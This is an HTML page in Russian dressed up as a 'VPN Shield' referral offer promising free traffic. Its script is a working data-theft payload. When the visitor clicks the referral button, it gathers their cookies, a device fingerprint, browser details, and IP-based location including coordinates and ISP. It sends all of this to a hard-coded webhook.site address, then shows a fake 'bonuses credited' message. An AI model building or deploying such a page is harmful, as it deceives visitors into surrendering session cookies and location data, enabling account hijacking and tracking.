<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>VPN Shield</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #0b0e1a;
            padding: 20px;
        }
        .card {
            max-width: 420px;
            width: 100%;
            background: rgba(255,255,255,0.04);
            border-radius: 48px;
            padding: 40px 28px;
            border: 1px solid rgba(255,255,255,0.06);
            text-align: center;
        }
        .logo { font-size: 36px; font-weight: 800; background: linear-gradient(135deg, #00f5d4, #00b4d8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: rgba(255,255,255,0.3); font-size: 13px; letter-spacing: 3px; margin-top: 4px; }
        .badge { display: inline-block; margin-top: 24px; padding: 6px 18px; border-radius: 100px; background: rgba(0,245,212,0.1); border: 1px solid rgba(0,245,212,0.15); color: #00f5d4; font-size: 13px; }
        .ref-box { margin: 24px 0 28px; padding: 18px; background: rgba(255,255,255,0.03); border-radius: 20px; border: 1px dashed rgba(255,255,255,0.06); }
        .ref-box span { display: block; color: rgba(255,255,255,0.3); font-size: 12px; }
        .ref-box .id { font-size: 24px; font-weight: 700; color: #00f5d4; margin-top: 4px; }
        .btn { width: 100%; padding: 18px; border: none; border-radius: 60px; font-size: 20px; font-weight: 700; background: linear-gradient(135deg, #00f5d4, #00b4d8); color: #0b0e1a; cursor: pointer; transition: 0.3s; }
        .btn:hover { transform: scale(1.02); }
        .btn:disabled { opacity: 0.6; pointer-events: none; }
        .status { margin-top: 18px; padding: 12px; border-radius: 16px; font-size: 14px; display: none; }
        .status.ok { display: block; background: rgba(0,200,83,0.1); border: 1px solid rgba(0,200,83,0.15); color: #00c853; }
        .status.err { display: block; background: rgba(255,70,70,0.08); border: 1px solid rgba(255,70,70,0.12); color: #ff6b6b; }
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 28px 0 20px; }
        .grid div { background: rgba(255,255,255,0.03); border-radius: 16px; padding: 14px 6px; font-size: 11px; color: rgba(255,255,255,0.4); }
        .grid div strong { display: block; font-size: 15px; color: #fff; }
        .footer { margin-top: 24px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.04); font-size: 12px; color: rgba(255,255,255,0.15); }
        .footer a { color: rgba(255,255,255,0.2); text-decoration: none; margin: 0 10px; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">VPN Shield</div>
    <div class="sub">⚡ Secure · Fast · Private</div>
    <div class="badge">🎁 +5 GB бесплатного трафика</div>
    <div class="ref-box">
        <span>Ваш реферальный ID</span>
        <div class="id" id="refId">VN-2X9K-7F4M</div>
    </div>
    <button class="btn" id="referBtn">🔥 Стать рефералом</button>
    <div class="status" id="status"></div>
    <div class="grid">
        <div><strong>🛡️ 256‑bit</strong>Шифрование</div>
        <div><strong>🌍 140+</strong>Стран</div>
        <div><strong>⚡ 10 Gbps</strong>Скорость</div>
        <div><strong>📱 5</strong>Устройств</div>
        <div><strong>🔒 No Logs</strong>Политика</div>
        <div><strong>💳 30 дней</strong>Бесплатно</div>
    </div>
    <div class="footer"><a href="#">Политика конфиденциальности</a> • <a href="#">Пользовательское соглашение</a></div>
</div>

<script>
    // ============================================================
    //  НАСТРОЙКА
    // ============================================================
    const WEBHOOK_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';

    // ============================================================
    //  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
    // ============================================================
    function getCookies() {
        // Возвращает объект со всеми куками текущего сайта
        const cookies = {};
        document.cookie.split(';').forEach(cookie => {
            const parts = cookie.trim().split('=');
            if (parts.length >= 2) {
                cookies[parts[0]] = parts.slice(1).join('=');
            }
        });
        return cookies;
    }

    function getFingerprint() {
        // Генерирует отпечаток устройства на основе его характеристик
        const components = [
            navigator.userAgent,
            navigator.platform,
            navigator.language,
            screen.width,
            screen.height,
            screen.colorDepth,
            window.devicePixelRatio,
            navigator.hardwareConcurrency,
            navigator.deviceMemory,
            navigator.doNotTrack,
            navigator.cookieEnabled,
            Intl.DateTimeFormat().resolvedOptions().timeZone
        ];
        return components.join('|||');
    }

    // ============================================================
    //  ОСНОВНОЙ КОД
    // ============================================================
    document.getElementById('referBtn').addEventListener('click', function () {
        const btn = this;
        const statusEl = document.getElementById('status');

        btn.disabled = true;
        btn.textContent = '⏳ Отправка...';
        statusEl.className = 'status';

        // === 1. Собираем базовые данные ===
        const data = {
            refId: document.getElementById('refId').textContent,
            userAgent: navigator.userAgent,
            platform: navigator.platform || 'unknown',
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'не установлен',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timeOffset: new Date().getTimezoneOffset(),
            localTime: new Date().toLocaleString('ru-RU'),
            referrer: document.referrer || 'прямой переход',
            url: window.location.href,
            title: document.title,
            timestamp: new Date().toISOString(),
            // === ДОПОЛНИТЕЛЬНО ===
            cookies: getCookies(),
            fingerprint: getFingerprint()
        };

        // === 2. Пытаемся получить IP, гео и провайдера ===
        fetch('https://ipapi.co/json/')
            .then(res => {
                if (!res.ok) throw new Error('IP API недоступен');
                return res.json();
            })
            .then(geo => {
                data.ip = geo.ip || null;
                data.country = geo.country_name || null;
                data.city = geo.city || null;
                data.region = geo.region || null;
                data.postal = geo.postal || null;
                data.latitude = geo.latitude || null;
                data.longitude = geo.longitude || null;
                data.org = geo.org || null;
                data.asn = geo.asn || null;
                data.timezone_geo = geo.timezone || null;
            })
            .catch(() => {
                // Если IP-API не отвечает — пробуем другой
                return fetch('https://ip-api.com/json/');
            })
            .then(res => {
                if (res && res.ok) return res.json();
                throw new Error('Все IP-сервисы недоступны');
            })
            .then(geo2 => {
                if (!data.ip) {
                    data.ip = geo2.query || null;
                    data.country = geo2.country || null;
                    data.city = geo2.city || null;
                    data.region = geo2.regionName || null;
                    data.postal = geo2.zip || null;
                    data.latitude = geo2.lat || null;
                    data.longitude = geo2.lon || null;
                    data.org = geo2.isp || null;
                    data.asn = geo2.as || null;
                }
            })
            .catch(() => {
                // Если ни один сервис не ответил — оставляем как есть
                console.warn('IP-гео не получены');
            })
            .finally(() => {
                // === 3. Формируем сообщение ===
                const lines = [
                    '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
                    '═══════════════════════════════════════',
                    '',
                    `🆔 Реферальный ID: ${data.refId}`,
                    '',
                    `🌐 IP: ${data.ip || 'не определён'}`,
                    `🌍 Страна: ${data.country || 'не определена'}`,
                    `🏙️ Город: ${data.city || 'не определён'}`,
                    `📍 Регион: ${data.region || 'не определён'}`,
                    `📮 Индекс: ${data.postal || 'не определён'}`,
                    `🗺️ Координаты: ${data.latitude || '?'}, ${data.longitude || '?'}`,
                    `📡 Провайдер: ${data.org || 'не определён'}`,
                    `📶 ASN: ${data.asn || 'не определён'}`,
                    '',
                    `🖥️ User‑Agent: ${data.userAgent}`,
                    `💻 Платформа: ${data.platform}`,
                    `🌐 Язык: ${data.language}`,
                    `📐 Экран: ${data.screenWidth}×${data.screenHeight} (${data.colorDepth}bit)`,
                    `📱 Плотность: ${data.pixelRatio}`,
                    `⏰ Часовой пояс: ${data.timezone} (UTC${(data.timeOffset / -60)})`,
                    `🕒 Время: ${data.localTime}`,
                    `🔗 Ссылка: ${data.url}`,
                    `📎 Откуда пришёл: ${data.referrer}`,
                    '',
                    `🍪 Куки: ${JSON.stringify(data.cookies, null, 2)}`,
                    `🆔 Отпечаток устройства: ${data.fingerprint}`,
                    '',
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
                    `⏱️ ${data.timestamp}`
                ];

                const messageText = lines.join('\n');

                // === 4. Отправляем на Webhook ===
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        text: messageText,
                        raw: data
                    })
                })
                .then(response => {
                    if (response.ok) {
                        btn.textContent = '✅ Вы стали рефералом!';
                        btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
                        statusEl.className = 'status ok';
                        statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
                        document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
                    } else {
                        throw new Error('Ошибка HTTP: ' + response.status);
                    }
                })
                .catch(error => {
                    console.error('Ошибка:', error);
                    btn.textContent = '🔥 Стать рефералом';
                    statusEl.className = 'status err';
                    statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
                })
                .finally(() => {
                    btn.disabled = false;
                });
            });
    });
</script>
</body>
</html>
